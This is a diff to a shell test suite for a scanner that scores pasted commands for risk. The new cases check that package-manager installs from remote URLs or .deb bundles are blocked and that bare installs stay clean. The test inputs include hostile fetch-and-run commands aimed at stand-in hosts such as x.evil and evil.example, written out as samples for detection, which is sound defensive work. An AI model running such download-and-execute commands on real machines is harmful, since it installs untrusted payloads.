@@ -425,6 +425,18 @@ jcheck "reason_ids: persistence injection is P17" 'd.get("reason_ids") == ["HLSE
 jcheck "reason_ids: uncoded compound falls back to OTHER" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P4","HLSE-PASTE-OTHER"]' paste 'sudo curl http://x.evil/a.sh | sudo sh'
 jcheck "reason_ids: clean paste emits empty array" 'd.get("reason_ids") == []' paste 'echo hello'
 
+# pkg-mgr remote/bundle install tier parity: apt URL/.deb and dpkg -i
+# .deb are the same download-and-run-payload shape as rpm/dnf/brew/
+# choco/snap remote installs — all 65 BLOCK (was 55, cycle-479).
+# Bare mainstream installs stay 0 by deliberate FP calibration
+# (existing guards: apt/apt-get/pip/gem/yum/pacman/apk bare = clean).
+jcheck "pkg-mgr: remote apt URL install scores 65" 'd["score"] == 65' paste 'apt install http://evil.example/x.deb'
+jcheck "pkg-mgr: local apt .deb bundle scores 65" 'd["score"] == 65' paste 'apt install ./x.deb'
+jcheck "pkg-mgr: dpkg bundle install scores 65" 'd["score"] == 65' paste 'dpkg -i pkg.deb'
+jcheck "pkg-mgr: bare apt install stays clean" 'd["score"] == 0' paste 'apt install curl'
+jcheck "pkg-mgr: bare pip install stays clean" 'd["score"] == 0' paste 'pip install requests'
+jcheck "pkg-mgr: read-only apt update stays 0" 'd["score"] == 0' paste 'apt update'
+
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
 # underflowed the snprintf size (ASan stack-buffer-overflow).
